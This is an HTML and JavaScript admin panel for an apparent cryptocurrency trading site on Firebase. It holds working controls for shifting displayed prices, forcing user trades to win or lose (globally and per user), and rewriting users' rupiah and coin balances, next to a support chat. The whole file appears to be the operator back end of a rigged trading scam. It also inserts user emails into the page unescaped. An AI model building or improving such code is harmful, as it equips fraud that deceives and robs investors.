<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Master Hub Pro V3 | Admin Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="config.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@700;800&display=swap');
        body { background: #000; color: #eee; font-family: 'Plus Jakarta Sans', sans-serif; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
        .glass { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); backdrop-filter: blur(10px); }
        .tab-content { display: none; flex: 1; overflow-y: auto; width: 100%; padding-bottom: 100px; }
        .tab-active { display: block; }
        .active-nav { color: #f3ba2f; border-bottom: 2px solid #f3ba2f; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .chat-bubble-admin { background: #f3ba2f; color: #000; align-self: flex-end; border-radius: 12px 12px 2px 12px; }
        .chat-bubble-user { background: #1a1a1a; color: #fff; align-self: flex-start; border-radius: 12px 12px 12px 2px; border: 1px solid #333; }
    </style>
</head>
<body class="p-4 md:p-8">
    <div class="max-w-[1400px] mx-auto w-full h-full flex flex-col">
        
        <header class="flex justify-between items-center mb-6 shrink-0">
            <h1 class="text-xl font-black italic italic tracking-tighter">MASTER <span class="text-[#f3ba2f]">HUB V3</span></h1>
            <nav class="flex gap-6 overflow-x-auto no-scrollbar">
                <button onclick="st('market')" id="n-market" class="active-nav py-2 text-[10px] font-black uppercase whitespace-nowrap">Market</button>
                <button onclick="st('users')" id="n-users" class="py-2 text-[10px] font-black uppercase whitespace-nowrap">Users & Saldo</button>
                <button onclick="st('chats')" id="n-chats" class="py-2 text-[10px] font-black uppercase whitespace-nowrap">Live Chat</button>
            </nav>
        </header>

        <div id="t-market" class="tab-content tab-active space-y-4">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="glass p-6 rounded-3xl">
                    <p class="text-[10px] font-black text-yellow-500 mb-4 uppercase">Price Offset</p>
                    <div class="flex gap-3">
                        <input type="number" id="offset-input" class="flex-1 bg-black/50 border border-white/10 p-4 rounded-2xl outline-none" placeholder="Contoh: 150">
                        <button onclick="applyOffset()" class="bg-yellow-500 text-black px-8 rounded-2xl font-black text-xs uppercase">Update</button>
                    </div>
                </div>
                <div class="glass p-6 rounded-3xl">
                    <p class="text-[10px] font-black text-yellow-500 mb-4 uppercase">Global Win/Loss</p>
                    <div class="grid grid-cols-3 gap-2">
                        <button onclick="setGlobal('win')" class="bg-green-600/20 text-green-500 p-3 rounded-xl font-bold text-[10px]">FORCE WIN</button>
                        <button onclick="setGlobal('normal')" class="bg-white/5 text-white p-3 rounded-xl font-bold text-[10px]">NORMAL</button>
                        <button onclick="setGlobal('loss')" class="bg-red-600/20 text-red-500 p-3 rounded-xl font-bold text-[10px]">FORCE LOSS</button>
                    </div>
                </div>
            </div>
        </div>

        <div id="t-users" class="tab-content">
            <div id="user-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                </div>
        </div>

        <div id="t-chats" class="tab-content h-full">
            <div class="flex flex-col md:flex-row gap-4 h-[70vh]">
                <div class="w-full md:w-1/3 glass rounded-3xl overflow-y-auto no-scrollbar p-2" id="contact-list">
                    </div>
                <div class="flex-1 glass rounded-3xl flex flex-col overflow-hidden bg-black/40">
                    <div id="chat-target" class="p-4 border-b border-white/5 font-black text-xs text-yellow-500 uppercase italic">Pilih User</div>
                    <div id="chat-window" class="flex-1 overflow-y-auto p-4 flex flex-col gap-3 no-scrollbar"></div>
                    <div class="p-4 bg-black/80 flex gap-2">
                        <input type="text" id="msg-input" class="flex-1 bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-xs outline-none" placeholder="Balas pesan...">
                        <button onclick="sendMsg()" class="bg-yellow-500 text-black w-12 h-12 rounded-xl flex items-center justify-center"><i data-lucide="send" class="w-5 h-5"></i></button>
                    </div>
                </div>
            </div>
        </div>

    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, collection, doc, onSnapshot, updateDoc, setDoc, query, orderBy, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const app = initializeApp(APP_CONFIG.firebase);
        const db = getFirestore(app);

        let activeUID = "";
        const COINS = ['BTC', 'ETH', 'BNB', 'SOL', 'TRX'];

        // --- CORE FUNCTIONS ---
        window.st = (t) => {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('tab-active'));
            document.querySelectorAll('nav button').forEach(el => el.classList.remove('active-nav'));
            document.getElementById('t-' + t).classList.add('tab-active');
            document.getElementById('n-' + t).classList.add('active-nav');
        };

        const toIDR = (num) => new Intl.NumberFormat('id-ID').format(num);

        // --- MARKET LOGIC ---
        window.applyOffset = async () => {
            const val = parseFloat(document.getElementById('offset-input').value) || 0;
            await setDoc(doc(db, "system", "market_control"), { offset: val }, { merge: true });
            alert("Market Updated!");
        };

        window.setGlobal = async (m) => {
            await setDoc(doc(db, "system", "market_control"), { mode: m }, { merge: true });
            alert("Global Mode: " + m.toUpperCase());
        };

        // --- USER MANAGEMENT LOGIC ---
        window.updateSaldo = async (uid, val) => {
            const clearVal = parseInt(val.replace(/[^0-9]/g, '')) || 0;
            try {
                await updateDoc(doc(db, "users", uid), { balance: clearVal });
                console.log("Saldo updated for:", uid);
            } catch(e) { console.error("Update fail:", e); }
        };

        window.updateCoin = async (uid, coin, val) => {
            const up = {}; up[`${coin.toLowerCase()}_bal`] = parseFloat(val) || 0;
            await updateDoc(doc(db, "users", uid), up);
        };

        window.forceUser = async (uid, mode) => {
            await updateDoc(doc(db, "users", uid), { next_trade: mode });
            alert("Target Set!");
        };

        // --- LIVE CHAT LOGIC ---
        window.openChat = (uid, email) => {
            activeUID = uid;
            document.getElementById('chat-target').innerText = `CHAT: ${email}`;
            updateDoc(doc(db, "users", uid), { lastRead: true }); // Tandai sudah dibaca
            
            onSnapshot(query(collection(db, "users", uid, "chats"), orderBy("timestamp", "asc")), (sn) => {
                const win = document.getElementById('chat-window');
                win.innerHTML = '';
                sn.forEach(d => {
                    const m = d.data();
                    const div = document.createElement('div');
                    div.className = `p-3 max-w-[80%] text-[11px] font-bold ${m.sender === 'admin' ? 'chat-bubble-admin' : 'chat-bubble-user'}`;
                    div.innerText = m.text;
                    win.appendChild(div);
                });
                win.scrollTop = win.scrollHeight;
            });
        };

        window.sendMsg = async () => {
            const inp = document.getElementById('msg-input');
            if(!activeUID || !inp.value.trim()) return;
            const text = inp.value;
            inp.value = '';
            await addDoc(collection(db, "users", activeUID, "chats"), { sender: 'admin', text: text, timestamp: serverTimestamp() });
            await updateDoc(doc(db, "users", activeUID), { lastMsgBy: 'admin', lastRead: true });
        };

        // --- REALTIME SYNC ---
        onSnapshot(collection(db, "users"), (snap) => {
            const grid = document.getElementById('user-grid');
            const contacts = document.getElementById('contact-list');
            grid.innerHTML = ''; contacts.innerHTML = '';

            snap.forEach(s => {
                const u = s.data();
                const id = s.id;
                const email = u.email || "No Email";

                // Render User Management Card
                let coinFields = '';
                COINS.forEach(c => {
                    coinFields += `
                    <div class="flex justify-between items-center bg-black/20 p-2 rounded-lg mb-1">
                        <span class="text-[8px] font-black text-gray-500">${c}</span>
                        <input type="number" step="any" onchange="updateCoin('${id}','${c}',this.value)" value="${u[c.toLowerCase()+'_bal'] || 0}" class="bg-transparent text-right text-[10px] outline-none text-yellow-500 w-20">
                    </div>`;
                });

                grid.innerHTML += `
                <div class="glass p-5 rounded-3xl space-y-4">
                    <div class="flex justify-between items-start">
                        <p class="text-[9px] font-black text-gray-400 truncate w-32">${email}</p>
                        <div class="flex gap-1">
                            <button onclick="forceUser('${id}','win')" class="px-2 py-1 bg-green-600/20 text-green-500 text-[7px] font-bold rounded">WIN</button>
                            <button onclick="forceUser('${id}','loss')" class="px-2 py-1 bg-red-600/20 text-red-500 text-[7px] font-bold rounded">LOSS</button>
                        </div>
                    </div>
                    <div class="bg-white/5 p-4 rounded-2xl border border-white/5">
                        <p class="text-[7px] font-black text-gray-500 uppercase mb-1">Saldo IDR</p>
                        <div class="flex items-center gap-1 font-black text-yellow-500">
                            <span class="text-xs">Rp</span>
                            <input type="text" value="${toIDR(u.balance || 0)}" 
                                oninput="this.value = toIDR(this.value.replace(/[^0-9]/g,'')); updateSaldo('${id}', this.value)" 
                                class="bg-transparent text-sm w-full outline-none">
                        </div>
                    </div>
                    <div class="grid grid-cols-1">${coinFields}</div>
                </div>`;

                // Render Contact List for Chat
                const unread = u.lastMsgBy === 'user' && u.lastRead === false;
                const cDiv = document.createElement('div');
                cDiv.className = `p-4 mb-2 rounded-2xl cursor-pointer flex justify-between items-center ${activeUID === id ? 'bg-yellow-500 text-black' : 'bg-white/5 text-gray-400'}`;
                cDiv.innerHTML = `<span class="text-[10px] font-black uppercase">${email.split('@')[0]}</span> ${unread ? '<div class="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>' : ''}`;
                cDiv.onclick = () => openChat(id, email);
                contacts.appendChild(cDiv);
            });
        });

        lucide.createIcons();
    </script>
</body>
</html>
